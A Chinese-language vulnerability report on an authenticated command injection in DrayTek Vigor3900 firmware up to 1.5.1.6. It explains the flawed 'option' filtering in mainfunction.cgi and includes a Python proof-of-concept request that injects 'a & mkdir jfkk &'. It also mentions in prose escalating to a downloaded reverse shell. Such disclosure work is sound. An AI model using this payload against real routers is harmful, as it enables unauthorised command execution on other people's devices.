# vigor3900中存在授权后的命令注入漏洞

## 1、基本信息

- 供应商：`DrayTek`
- 产品型号：`vigor3900`
- 影响版本：`<= 1.5.1.6`
- 漏洞类型：授权的命令注入

## 2、漏洞描述

`vigor3900`路由器的`1.5.1.6`固件版本的二进制文件中存在授权后的命令注入漏洞，漏洞位于`/www/cgi-bin/mainfunction.cgi`文件中，由于该文件在处理请求时，对相关字段的值进行过滤时考虑不当，导致了命令注入，如下所示。

![image-20240817160748049](C:\Users\lenovo\Desktop\CVE_Reproduce\vigor3900漏洞\pic\image-20240817160748049.png)

我们可以控制`option`字段的值，从而控制`system`函数的执行，在获取到`option`字段的值后，会赋值给`value`，然后通过`filter_string`函数对`value`进行过滤，但该函数并未过滤`空格`和`&`字符，这将导致命令注入。虽然`v8`中使用单引号对`v4`进行了闭合，但是`/sbin/logread >/tmp/'%s'`语句会在`tmp`目录下创建一个文件。

比如执行`/sbin/logread > /tmp/'a & mkdir hack & '`，这就会在`tmp`下创建一个名为`a & mkdir hack & ` 的文件。

![image-20240817162034624](C:\Users\lenovo\Desktop\CVE_Reproduce\vigor3900漏洞\pic\image-20240817162034624.png)

那后续在对该文件进行操作时，比如使用`ls -lla a & mkdir hack &  ` 来查看文件，这就变成了先执行`ls -lla a`，然后再执行`mkdir hack`命令，这样如果恶意者构造相关命令，比如通过`wget`下载反弹脚本，然后执行该脚本，就能够导致`RCE`。

![image-20240817162200296](C:\Users\lenovo\Desktop\CVE_Reproduce\vigor3900漏洞\pic\image-20240817162200296.png)

## 3、漏洞验证

构建的POC如下，其中，要有相关的`Cookie`值。

```python
import requests

def send_post_request(ip_address, session_cookie, option_value):
    url = f"http://{ip_address}/cgi-bin/mainfunction.cgi"

    headers = {
        "Host": ip_address,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": session_cookie,
        "Connection": "close"
    }

    data = {
        "action": "dumpSyslog",
        "option": option_value
    }

    response = requests.post(url, headers=headers, data=data)
    return response.text

ip_address = "10.10.10.2"
session_cookie = "SESSION_ID_VIGOR=7:F657C2D5AE041116E7003E8F7C8B7EFA"
option_value = "a & mkdir jfkk &"

response_text = send_post_request(ip_address, session_cookie, option_value)
print(response_text)

```

由下可以看出，我们成功创建了一个名为`jfkk2`的文件夹

![image-20240817161616943](C:\Users\lenovo\Desktop\CVE_Reproduce\vigor3900漏洞\pic\image-20240817161616943.png)

![image-20240817161707388](C:\Users\lenovo\Desktop\CVE_Reproduce\vigor3900漏洞\pic\image-20240817161707388.png)